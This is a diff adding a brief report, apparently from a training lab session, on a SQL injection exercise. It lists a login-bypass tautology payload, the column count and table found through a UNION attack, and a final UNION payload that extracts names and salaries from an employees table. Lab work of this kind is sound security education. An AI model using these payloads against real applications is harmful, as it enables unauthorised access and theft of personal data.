@@ -1,0 +1,17 @@
+SESSION 25: SQL INJECTION EXFILTRATION REPORT
+1. AUTHENTICATION BYPASS
+
+Tautology Payload Used: ' OR 1=1 --
+
+2. DATABASE MAPPING (UNION ATTACK)
+
+Number of Columns Discovered: 2
+
+Table Name Discovered: employees
+
+3. DATA EXFILTRATION
+
+CEO Salary Extracted:2,500,000 (Verify this on your Web Preview screen)
+
+Final UNION Payload Used: ' UNION SELECT name, salary FROM employees --
+
